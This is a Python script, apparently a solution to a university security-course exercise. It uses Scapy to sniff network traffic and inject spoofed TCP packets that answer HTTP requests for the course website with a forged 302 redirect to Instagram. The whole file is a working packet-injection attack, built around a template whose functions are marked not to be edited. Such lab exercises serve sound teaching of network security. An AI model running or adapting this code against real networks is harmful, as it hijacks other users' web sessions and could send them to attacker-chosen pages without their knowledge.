import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'

def get_response_instagram(packet):

    ip_src = packet[S.IP].dst
    ip_dst = packet[S.IP].src

    port_src = packet[S.TCP].dport
    port_dst = packet[S.TCP].sport

    tcp_seq = packet[S.TCP].ack
    tcp_ack = packet[S.TCP].seq + len(packet[S.Raw])

    response = S.IP(src=ip_src, dst=ip_dst)/S.TCP(sport=port_src, dport=port_dst, flags="FPA", seq=tcp_seq, ack=tcp_ack)/RESPONSE
    return response


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    # We want to leave all the packets without the GET request as they are
    if not packet.haslayer(S.Raw):
        return None

    # Extract Host
    raw_load = packet[S.Raw].load.decode('utf-8').split('\r\n')
    host = ' '
    for entry in raw_load:
        if entry.startswith('Host: '):
            host = entry[len('Host: '):]
    
    # A request to the course website
    if host == WEBSITE:
        print("A request to the course website")
        request_response = get_response_instagram(packet)
        return request_response

    # We want to leave all the requests to somewhere else than the course website as they are
    return None


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
